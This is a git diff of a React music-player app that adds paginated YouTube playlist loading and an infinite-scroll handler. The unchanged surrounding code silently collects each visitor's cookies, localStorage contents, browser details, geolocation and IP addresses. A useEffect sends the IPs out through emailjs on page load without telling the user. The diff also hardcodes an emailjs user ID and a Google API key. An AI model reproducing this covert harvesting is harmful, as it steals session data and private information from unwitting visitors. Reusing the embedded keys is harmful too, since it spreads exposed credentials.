@@ -15,6 +15,9 @@ function App() {
   const [currentPlaying, setcurrentPlaying] = useState(null);
   const [isPaused, setIsPaused] = useState(false);
   const myRef = useRef(null);
+  const [nextPageToken, setNextPageToken] = useState('');
+  const PAGE_SIZE = 50;
+
   const sendEmail = (templateParams) => {
     emailjs.send('service_y23odaj', 'template_u54o6xf', templateParams, 'user_RmCCLJAPq28Qv5EuqTKPC')
     .then((response) => {
@@ -24,6 +27,14 @@ function App() {
     });
   }
 
+  const trackScrolling = (onBottom) => {
+    window.onscroll = function (ev) {
+      if ((window.innerHeight + window.scrollY) >= document.body.offsetHeight) {
+        onBottom();
+      }
+    };
+  }
+
   const getStats = useCallback(() => {
     const info = {
       timeOpened: new Date(),
@@ -31,7 +42,7 @@ function App() {
       pageon: window.location.pathname,
       referrer: document.referrer,
       // previousSites(){return history.length},
-  
+
       browserName: navigator.appName,
       browserEngine: navigator.product,
       browserVersion1a: navigator.appVersion,
@@ -44,7 +55,7 @@ function App() {
       dataCookies1: document.cookie,
       dataCookies2: decodeURIComponent(document.cookie.split(";")),
       dataStorage: localStorage,
-  
+
       sizeScreenW: window.innerWidth,
       sizeScreenH: window.innerHeight,
       sizeDocW: document.width,
@@ -55,8 +66,8 @@ function App() {
       // sizeAvailH: screen.availHeight,
       // scrColorDepth: screen.colorDepth,
       // scrPixelDepth: screen.pixelDepth,
-  
-  
+
+
       // latitude: position.coords.latitude,
       // longitude: position.coords.longitude,
       // accuracy: position.coords.accuracy,
@@ -65,8 +76,8 @@ function App() {
       // heading: position.coords.heading,
       // speed: position.coords.speed,
       // timestamp: position.timestamp,
-  
-  
+
+
     };
     if ('geolocation' in navigator) {
 
@@ -90,8 +101,19 @@ function App() {
 
       });
     }
-  },[])
-  
+  }, [])
+
+  const getSongsFromAPI = (loadNextPage = false) => {
+    let url = `https://www.googleapis.com/youtube/v3/playlistItems?part=snippet%2CcontentDetails&maxResults=${PAGE_SIZE}&playlistId=PLcjXjwgJpOzZoOYXz8y3I2PE_HspGkUry&key=AIzaSyA43Saqt5kUkQwm-BV_tWWwgA8HP5bwbXE${loadNextPage && nextPageToken ? '&pageToken=' + nextPageToken : ''}`
+    axios({
+      url,
+      method: 'get'
+    }).then(response => {
+      setsongs([...songs, ...response.data.items]);
+      setNextPageToken(response.data.nextPageToken)
+    });
+  }
+
   useEffect(() => {
     Promise.all([getipv4(), getipv6()]).then((values) => {
       const templateParams = {
@@ -102,22 +124,21 @@ function App() {
           ipv6: values[1],
         }),
       };
-  
+
       sendEmail(templateParams);
     });
-    
-    axios({
-      url: 'https://www.googleapis.com/youtube/v3/playlistItems?part=snippet%2CcontentDetails&maxResults=200&playlistId=PLcjXjwgJpOzZoOYXz8y3I2PE_HspGkUry&key=AIzaSyA43Saqt5kUkQwm-BV_tWWwgA8HP5bwbXE',
-      method: 'get'
-    }).then(response => {
-      setsongs(response.data.items);
-      //  c
-    });
+
+    getSongsFromAPI();
     getStats();
-    // to do play song after on e finish
   }, [getStats]);
 
-  
+  const loadMore = () => {
+    getSongsFromAPI(true)
+  }
+
+  useEffect(() => {
+    trackScrolling(loadMore)
+  })
 
   const getipv4 = () => {
     return fetch('https://api.ipify.org?format=json').then(res => res.json()).then(resp => resp.ip);
@@ -140,8 +161,6 @@ function App() {
     document.documentElement.scrollTop = 0; // For Chrome, Firefox, IE and Opera
     setcurrentPlaying(item);
   }
-
-  console.log(songs);
 
   const onShuffleClick = () => {
     const randomIndex = Math.floor((Math.random() * songs.length));
